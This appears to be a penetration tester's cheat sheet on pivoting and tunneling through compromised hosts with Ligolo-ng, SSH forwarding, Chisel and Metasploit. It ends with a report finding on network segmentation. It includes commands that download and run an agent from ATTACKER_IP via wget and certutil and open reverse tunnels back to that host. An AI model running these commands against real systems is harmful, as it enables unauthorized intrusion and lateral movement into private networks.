# Network Pivoting & Tunneling

## When to Pivot

**You need to pivot when:**
- Compromised host has multiple network interfaces
- Found credentials but can't reach systems directly
- Internal network discovered from compromised host
- Need to access services only accessible from inside

**Check for pivot opportunities:**
```bash
# Linux
ip a
ip route
arp -a

# Windows
ipconfig /all
route print
arp -a
```

## Ligolo-ng 

### Setup

**On Kali (proxy server):**
```bash
# Download
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_*
chmod +x proxy

# Start proxy
sudo ./proxy -selfcert
```

**On compromised host (agent):**
```bash
# Transfer agent binary
# Linux:
wget http://ATTACKER_IP/agent
chmod +x agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows:
certutil -urlcache -f http://ATTACKER_IP/agent.exe agent.exe
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### Using Ligolo

**On Kali (in ligolo proxy interface):**
```
# Session should appear
ligolo-ng » session

# Select session (use tab completion)
ligolo-ng » session 1

# Add route to internal network
ligolo-ng » route_add 192.168.2.0/24

# Start tunnel
ligolo-ng » start

# Now you can access internal network directly!
nmap 192.168.2.0/24
netexec smb 192.168.2.10 -u USERNAME -p 'PASSWORD'
```

**On Kali (setup interface - one time):**
```bash
# Create tunnel interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Add route (after starting ligolo tunnel)
sudo ip route add 192.168.2.0/24 dev ligolo
```

## SSH Tunneling (Alternative)

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Setup SSH tunnel
ssh -D 9050 user@COMPROMISED_HOST

# Use with proxychains
proxychains nmap -sT -Pn 192.168.2.10
proxychains netexec smb 192.168.2.10 -u USERNAME -p 'PASSWORD'

# Configure proxychains
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 9050
```

### Local Port Forwarding
```bash
# Forward remote service to local port
ssh -L 3389:192.168.2.10:3389 user@COMPROMISED_HOST

# Now access via localhost
xfreerdp /v:localhost:3389 /u:USERNAME /p:PASSWORD
```

### Remote Port Forwarding
```bash
# Expose Kali port on compromised host
ssh -R 8080:localhost:80 user@COMPROMISED_HOST

# Compromised host can now access Kali's port 80 via localhost:8080
# Useful for file transfers from deep networks
```

## Chisel (Alternative)

### Setup

**On Kali:**
```bash
./chisel server -p 8000 --reverse
```

**On compromised host:**
```bash
# SOCKS proxy
./chisel client ATTACKER_IP:8000 R:socks

# Use with proxychains as before
```

## Metasploit Pivoting

### autoroute
```bash
# In meterpreter session
run autoroute -s 192.168.2.0/24

# Background session
background

# Use auxiliary modules through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 80,443,445,3389
run
```

### Port Forwarding
```bash
# Forward remote RDP to local port
portfwd add -l 3389 -p 3389 -r 192.168.2.10

# Access via localhost
xfreerdp /v:localhost /u:USERNAME
```

## Double Pivot (Network → Network → Network)

```bash
# Pivot 1: Kali → DMZ (10.10.10.50)
ssh -D 9050 user@10.10.10.50

# Pivot 2: DMZ → Internal (from DMZ host)
ssh -D 9051 user@192.168.1.50

# Now use proxychains with second proxy for deepest network
# Edit /etc/proxychains.conf to chain SOCKS proxies
```

## Managing Multiple Pivots

### Track Your Pivots
```
Kali (ATTACKER_IP)
  ↓ SSH tunnel (9050)
DMZ Host (10.10.10.50)
  ↓ Ligolo tunnel
Internal Network (192.168.1.0/24)
  ↓ SSH tunnel from 192.168.1.50
Restricted Network (172.16.0.0/24)
```

### tmux Organization
```bash
# Window 0: Kali commands
# Window 1: DMZ shell (10.10.10.50)
# Window 2: Internal shell (192.168.1.50)  
# Window 3: Ligolo proxy interface
# Window 4: Notes on network topology
```

## Troubleshooting

### Pivot Not Working
```bash
# Check if tunnel is up
ip route  # Should show route to internal network

# Test connectivity
ping 192.168.2.10  # Should work through tunnel

# Check ligolo session
# In ligolo: session → should show active
```

### Performance Issues
```bash
# Ligolo is faster than SSH tunnels
# Use Ligolo for heavy traffic (nmap scans)
# Use SSH for simple access
```

## Timeline
- Ligolo setup: 5 minutes
- Add routes: 1 minute
- Test access: 1 minute
- Total: 7-10 minutes per pivot

## GhostWriter Finding
**Severity:** MEDIUM (network segmentation issue)
**Title:** Insufficient Network Segmentation Enables Lateral Movement
**Impact:** Compromised DMZ host provides access to internal network
